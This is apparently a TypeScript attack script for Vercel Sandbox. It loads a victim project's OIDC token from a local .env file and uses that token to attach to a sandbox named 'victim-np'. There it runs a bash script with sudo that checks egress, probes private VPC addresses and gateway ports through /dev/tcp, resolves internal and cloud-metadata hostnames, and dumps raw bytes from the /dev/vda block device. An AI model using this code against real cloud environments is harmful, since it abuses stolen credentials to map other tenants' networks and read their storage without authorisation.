import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = `
echo "===== proxy env ====="
env | grep -i proxy
cat /etc/environment 2>/dev/null
echo "===== egress verbose ====="
for u in https://api.ipify.org http://checkip.amazonaws.com https://1.1.1.1/cdn-cgi/trace https://www.google.com; do
  echo "--- $u ---"
  curl -sv -m 8 -o /dev/null -w "HTTP %{http_code} ip=%{remote_ip} tls=%{ssl_verify_result}\\n" "$u" 2>&1 | tail -4
done
echo "===== VPC neighbors reachability ====="
for ip in 172.31.0.1 172.31.0.2 172.31.1.1 172.31.2.1 172.31.0.3 172.31.0.4 172.31.16.1; do
  (timeout 2 bash -c "echo > /dev/tcp/$ip/80" 2>/dev/null && echo "$ip:80 OPEN") || echo "$ip:80 closed"
done
echo "--- gw scan ---"
for p in 22 80 443 8080 3000 8000 2050 23456; do
  (timeout 2 bash -c "echo > /dev/tcp/100.64.0.1/$p" 2>/dev/null && echo "gw:100.64.0.1:$p OPEN") || echo "gw:$p closed"
done
echo "===== DNS internal resolution ====="
for h in ip-172-31-0-2.ec2.internal metadata.google.internal instance-data.ec2.internal ec2.internal compute.internal; do
  getent hosts $h 2>&1 | head -1
done
echo "--- reverse of 172.31.0.2 ---"
getent hosts 172.31.0.2 2>&1 | head -1
echo "===== /dev/vda readable? ====="
ls -la /dev/vda /dev/vdb 2>/dev/null
dd if=/dev/vda bs=512 count=2 2>&1 | xxd | head -5
echo "===== block devices ====="
lsblk 2>/dev/null; cat /proc/partitions
echo "===== vda mounts / content ====="
ls -la /run/vercel/share/ 2>/dev/null
xxd /etc/hosts | head -10
echo "===== read vda fs superblock strings ====="
dd if=/dev/vda bs=4096 count=64 2>/dev/null | strings | head -40
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });